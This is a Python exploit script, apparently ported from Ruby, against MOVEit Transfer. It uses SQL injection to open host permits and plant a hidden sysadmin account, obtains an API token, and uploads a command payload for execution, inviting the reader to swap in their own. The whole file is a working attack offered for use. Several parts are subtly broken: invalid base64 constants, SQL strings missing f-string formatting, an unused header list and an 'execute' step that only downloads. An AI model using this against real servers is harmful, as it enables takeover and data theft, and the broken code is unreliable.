import requests
import hashlib
import base64
import json
import random
import string
from requests import InsecureRequestWarning
from urllib.parse import quote

# Suppress the warning that occurs when making insecure requests (i.e., not verifying SSL/TLS certificates)
# Suppress only the single InsecureRequestWarning from urllib3
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "https://10.0.0.193"

HEADERS = [
    # List of headers from the Ruby script
    'X-siLock-AgentBrand', 'X-siLock-AgentVersion', 'X-siLock-CanAcceptCompress', 'X-siLock-CanAcceptLumps',
    'X-siLock-CanCheckHash', 'X-siLock-Challenge', 'X-siLock-CheckVirus', 'X-siLock-ClientType', 'X-siLock-CS2-Allow204',
    'X-siLock-CS2-AVDLP', 'X-siLock-CS2-BlockOnError', 'X-siLock-CS2-ChunkSizeKB', 'X-siLock-CS2-ConnTimeoutSecs',
    'X-siLock-CS2-DoPreview', 'X-siLock-CS2-Engine', 'X-siLock-CS2-Error', 'X-siLock-CS2-ISTag', 'X-siLock-CS2-MaxFileSize',
    'X-siLock-CS2-Name', 'X-siLock-CS2-RecvTimeoutSecs', 'X-siLock-CS2-SendTimeoutSecs', 'X-siLock-CS2-Tries',
    'X-siLock-CS2-Type', 'X-siLock-CS2-URL', 'X-siLock-CS-Allow204', 'X-siLock-CS-AVDLP', 'X-siLock-CS-BlockOnError',
    'X-siLock-CS-ChunkSizeKB', 'X-siLock-CS-ConnTimeoutSecs', 'X-siLock-CS-DoPreview', 'X-siLock-CS-Engine',
    'X-siLock-CS-Error', 'X-siLock-CS-ISTag', 'X-siLock-CS-MaxFileSize', 'X-siLock-CS-Name', 'X-siLock-CS-RecvTimeoutSecs',
    'X-siLock-CSRFToken', 'X-siLock-CS-SendTimeoutSecs', 'X-siLock-CS-Tries', 'X-siLock-CS-URL', 'X-siLock-DLPChecked',
    'X-siLock-DLPViolation', 'X-siLock-DownloadToken', 'X-siLock-Duration', 'X-siLock-ErrorCode', 'X-siLock-ErrorDescription',
    'X-siLock-FileID', 'X-siLock-FileIDToDelete', 'X-siLock-FilePath', 'X-siLock-FileSize', 'X-siLock-FolderID',
    'X-siLock-FolderPath', 'X-siLock-FolderType', 'X-siLock-Hash', 'X-siLock-HashOK', 'X-siLock-InstID',
    'X-siLock-IntegrityVerified', 'X-siLock-IPAddress', 'X-siLock-LangCode', 'X-siLock-LoginName', 'X-siLock-LogRecID',
    'X-siLock-MailboxOwner', 'X-siLock-NotificationID', 'X-siLock-OriginalFilename', 'X-siLock-PackageID',
    'X-siLock-PartialFileID', 'X-siLock-PartialFilePath', 'X-siLock-Password', 'X-siLock-RealName', 'X-siLock-RelativePath',
    'X-siLock-ResumeInPlace', 'X-siLock-SessionID', 'X-siLock-SessVar', 'X-siLock-TimeBegun', 'X-siLock-TimeElapsed',
    'X-siLock-TimeEnded', 'X-siLock-Transaction', 'X-siLock-Untrusted', 'X-siLock-UploadComment', 'X-siLock-UserFilename',
    'X-siLock-Username', 'X-siLock-VirusChecked', 'X-siLock-XferFormat'
]

def log(msg):
    print(f"[+] {msg}")

# Function to generate a random string of a given length
def rand_string(len):
    return ''.join(random.choice(string.ascii_letters) for _ in range(len))

# Function to generate a version 1 password given a password and an optional salt
def makev1password(password, salt='AAAA'):
    pwpre = base64.b64decode('=VT2jkEH3vAs=')
    pwpost = base64.b64decode('=0maaSIA5oy0=')
    md5 = hashlib.md5()
    md5.update(pwpre)
    md5.update(salt.encode('utf-8'))
    md5.update(password.encode('utf-8'))
    md5.update(pwpost)
    
    pw = bytearray([12, 0, 0, 0])
    pw.extend(salt.encode('utf-8'))
    pw.extend(md5.digest())
    return base64.b64encode(pw).decode('utf-8').replace('+', '-')

def sqli(cookies, sql_payload):
    for sql in sql_payload:
        encoded_sql = quote(sql)
        url = f"{TARGET}/api/v1/SendFaxes?skip=0&take=20&filter=SenderDisplayName+eq+'{encoded_sql}'"
        response = requests.get(url, verify=False, cookies=cookies)
        if response.status_code != 200:
            raise Exception(f"SQLi failed: {response.text}")

def upload_file(token, file_content):
    url = f"{TARGET}/api/v1/files/upload"
    files = {'file': ('payload.txt', file_content)}
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.post(url, headers=headers, files=files, verify=False)
    if response.status_code != 200:
        raise Exception(f"File upload failed: {response.text}")
    return response.json()['id']

def execute_file(token, file_id):
    url = f"{TARGET}/api/v1/files/{file_id}/download"
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(url, headers=headers, verify=False)
    if response.status_code != 200:
        raise Exception(f"File execution failed: {response.text}")
    log("File executed successfully!")

def main():
    log(f"Starting. target='{TARGET}'.")
    
    # Step 1: Initialization and acquiring the initial session token and InstID
    log("Getting a session cookie...")
    response = requests.get(TARGET, verify=False)
    cookies = response.cookies.get_dict()
    
    token = cookies.get('ASP.NET_SessionId')
    instid = cookies.get('siLockLongTermInstID')
    
    if not token or not instid:
        raise Exception("Couldn't find token or InstID from cookies!")
    log(f"Retrieved initial session token '{token}' and InstID '{instid}'.")
    
    # Step 2: Creating a sysadmin account using SQL injection
    hax_username = rand_string(8)
    hax_loginname = rand_string(8)
    hax_password = rand_string(8)
    
    createuser_payload = [
        "UPDATE moveittransfer.hostpermits SET Host='*.*.*.*' WHERE Host!='*.*.*.*'",
        f"INSERT INTO moveittransfer.users (Username) VALUES ('{hax_username}')",
        f"UPDATE moveittransfer.users SET LoginName='{hax_loginname}' WHERE Username='{hax_username}'",
        f"UPDATE moveittransfer.users SET InstID='{instid}' WHERE Username='{hax_username}'",
        f"UPDATE moveittransfer.users SET Password='{makev1password(hax_password, rand_string(4))}' WHERE Username='{hax_username}'",
        "UPDATE moveittransfer.users SET Permission='40' WHERE Username='{hax_username}'",
        "UPDATE moveittransfer.users SET CreateStamp=NOW() WHERE Username='{hax_username}'",
    ]
    
    log(f"Creating new sysadmin account: username='{hax_username}', userlogin='{hax_loginname}', password='{hax_password}'.")
    sqli(cookies, createuser_payload)
    
    # Step 3: Getting an API Token
    log("Getting an API Token...")
    token_response = requests.post(
        f"{TARGET}/api/v1/token",
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        data=f"grant_type=password&username={hax_loginname}&password={hax_password}"
    )
    
    if token_response.status_code != 200:
        raise Exception(f"Couldn't get API token ({token_response.text})")
    
    token_json = token_response.json()
    api_token = token_json['access_token']
    log(f"Got API access token='{api_token}'.")
    
    # Step 4: Uploading and executing a file
    file_content = "echo 'Hello, World!' > /tmp/hello_world.txt"  # Example payload; replace with your own
    file_id = upload_file(api_token, file_content)
    log(f"Uploaded file with ID='{file_id}'.")
    execute_file(api_token, file_id)
    
if __name__ == "__main__":
    main()
